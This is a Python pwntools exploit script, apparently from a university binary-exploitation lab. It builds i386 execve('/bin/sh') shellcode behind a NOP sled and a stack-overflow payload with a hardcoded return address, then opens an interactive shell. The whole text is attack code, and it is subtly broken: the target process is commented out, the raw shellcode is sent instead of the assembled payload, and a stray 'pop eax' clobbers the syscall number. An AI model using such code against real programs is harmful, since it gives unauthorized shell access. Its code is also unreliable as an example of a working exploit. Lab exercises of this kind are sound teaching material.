from pwn import *

context.update(arch='i386', os='linux')

# p = process('./home/lab05/tut05-1-pwntools/target')

shellcode = '''
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx, esp
push 0x1010101
xor dword ptr [esp], 0x1016972
xor ecx, ecx
push ecx /* null terminate */
push 4
pop ecx
add ecx, esp
push ecx /* 'sh\x00' */
mov ecx, esp
xor edx, edx
mov eax, 8
inc eax
inc eax
inc eax
pop eax
int 0x80
'''
shellcode = asm(shellcode)
nod_sled = asm("nop") * 0x200
shellcode = nod_sled + shellcode
print (shellcode)

payload = cyclic(cyclic_find(0x61616166))
payload += p32(0xffffd540)
payload += shellcode

p.sendline(shellcode)
p.interactive()